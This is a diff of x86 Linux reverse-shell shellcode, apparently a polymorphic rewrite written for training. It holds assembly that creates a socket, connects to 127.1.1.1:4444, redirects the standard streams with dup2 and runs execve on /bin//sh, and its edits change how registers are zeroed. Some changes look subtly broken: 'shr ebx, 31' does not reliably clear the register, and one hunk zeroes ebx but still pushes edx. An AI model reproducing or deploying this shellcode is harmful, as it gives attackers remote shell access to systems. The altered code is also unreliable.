@@ -9,16 +9,15 @@ global _start:
 _start:
   ; socketcall (0x66)
   ;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol);
-  mov eax, 0xffffffff
-  add eax, 0x1
-  mov ebx, 0xffffffff
-  add ebx, 0x1
+  mov eax, 0xFFFFFFFF
+  add eax, 1
+  shr ebx, 31
   mov al, 0x66
   mov bl, 0x01
 
-  ; pushing arguments to the stack backwards: int protocol (PF_INET, SOCK_STREAM, 0) 
-  mov edx, 0xffffffff
-  add edx, 0x1
+  ; pushing arguments to the stack backwards: int protocol (PF_INET, SOCK_STREAM, 0)
+  mov ebx, 0xFFFFFFFF
+  add ebx, 1
   push edx     ; int domain
 
   push 0x01     ; SOCK_STREAM
@@ -37,11 +36,11 @@ _start:
   mov al, 0x66
   mov bl, 0x03
 
-  ; pushing arguments to the stack backwards: 
+  ; pushing arguments to the stack backwards:
   ; connect(sockid, (struct sockaddr *) &addrport, sizeof(addrport));
 
   push 0x0101017f    ; 127.1.1.1
-  push word 0x5c11   ; port 4444 
+  push word 0x5c11   ; port 4444
   push word 0x02    ; PF_INET
 
   mov ecx, esp
@@ -58,16 +57,15 @@ _start:
 
   ; dup2 - __NR_dup2                63
   ; dup2(0), dup2(1), dup2(2)
-  ; (0 - stdin, 1 - stdout, 2 - stderr) 
+  ; (0 - stdin, 1 - stdout, 2 - stderr)
 
   ; let's put all this in a loop
-  mov ecx, 0xffffffff
-  add ecx, 0x1
+  sub ecx, ecx
 
   DUPCOUNT:
   ; int dup2(int oldfd, int newfd);
-  mov eax, 0xffffffff
-  add eax, 0x1
+  mov eax, 0xFFFFFFFF
+  add eax, 1
   mov al, 0x3f
 
   ; ebx (socket descriptor, being copied over from esi saved earlier)
@@ -83,21 +81,19 @@ _start:
   jle DUPCOUNT     ; count until 2 is reached
 
 
-  ; execve (0x0b) 
+  ; execve (0x0b)
   ;   /bin//sh
-  mov eax, 0xffffffff
-  add eax, 0x1
+  mov eax, 0xFFFFFFFF
+  add eax, 1
   ; xor ebx, ebx
   push eax     ; reserve some bytes in the stack to work with
 
   mov al, 0x0b
   push 0x68732f2f   ; //sh
   push 0x6e69622f   ; /bin
-
   mov ebx, esp
 
-  mov ecx, 0xffffffff
-  add ecx, 0x1
+  sub ecx, ecx
 
   ; syscall
   int 0x80
